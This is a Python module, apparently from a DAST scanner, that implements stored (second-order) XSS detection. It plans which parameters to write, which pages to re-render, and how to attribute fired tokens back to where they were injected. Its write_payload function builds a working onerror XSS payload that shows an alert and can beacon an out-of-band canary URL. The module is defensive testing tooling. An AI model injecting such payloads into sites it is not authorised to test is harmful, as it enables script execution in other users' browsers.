"""Stored / second-order XSS -- the two-phase oracle a reflected check can't see.

Reflected XSS executes in the SAME response; stored XSS is submitted at one endpoint, PERSISTED, and
executes later on a DIFFERENT page (a comment on a listing, a profile on an admin view). So the witness
can't be the per-param send()/response oracle -- it is a campaign:

  WRITE   inject a UNIQUE-token payload into each writable param. The payload both pops a dialog (so a
          headless render is a hard DOM-execution witness) AND beacons our OAST canary (so an async
          viewer -- an admin opening the record minutes later -- still proves it, out of band).
  OBSERVE re-render the surface pages in the headless browser and watch the canary; a token that fires
          anywhere proves stored XSS, and the token maps the execution back to WHERE it was injected.

This module is the PURE core (payloads, which params to write, which pages to watch, token matching);
dast_scan drives the network/browser/canary around it.
"""
from __future__ import annotations

import secrets


def new_token():
    """A unique, alphanumeric token (survives HTML/URL round-trips) tying an execution back to its write."""
    return "wsx" + secrets.token_hex(4)


def write_payload(token, canary_url=None):
    """One payload carrying `token` that (a) pops alert(token) -> DOM-execution witness on render, and
    (b) if we have a canary, beacons it -> out-of-band witness for an async/admin-side render."""
    beacon = f";new Image().src='{canary_url}'" if canary_url else ""
    return f"<img src=x onerror=\"alert('{token}'){beacon}\">"


def plan_writes(targets, cap=40):
    """Which targets to write a stored payload into: body/query params (the user-writable surface),
    capped so a big spec can't blow up the write phase. Pure. Returns [(method, route, vector, param)]."""
    out = []
    for method, route, vector, param in targets or []:
        if vector in ("body", "query"):
            out.append((method, route, vector, param))
        if len(out) >= cap:
            break
    return out


def observe_pages(routes, written_paths=(), cap=25):
    """The GET pages to re-render looking for a fired token: every known GET route plus the paths we
    just wrote to (the record's own view), deduped, capped. Pure."""
    seen, out = set(), []
    for p in list(written_paths) + [r.path for r in (routes or []) if str(r.method).upper() == "GET"]:
        if p and p not in seen:
            seen.add(p)
            out.append(p)
        if len(out) >= cap:
            break
    return out


def match_execs(execs, token_map):
    """Given the execution strings captured on a page and {token: source-label}, return the list of
    (token, source) whose token fired here. Pure -- the heart of attributing a stored hit to its sink."""
    hits = []
    blob = " ".join(str(e) for e in (execs or []))
    for token, source in (token_map or {}).items():
        if token in blob:
            hits.append((token, source))
    return hits


def stored_reflection(body, token, payload):
    """Browser-less fallback: the payload persisted and comes back UN-encoded in a later page body. This
    is weaker than execution (reflection != firing) -> the caller reports it as anomalous_state. Pure."""
    b = body or ""
    return token in b and (payload in b or f"onerror=\"alert('{token}')" in b or f"alert('{token}')" in b)
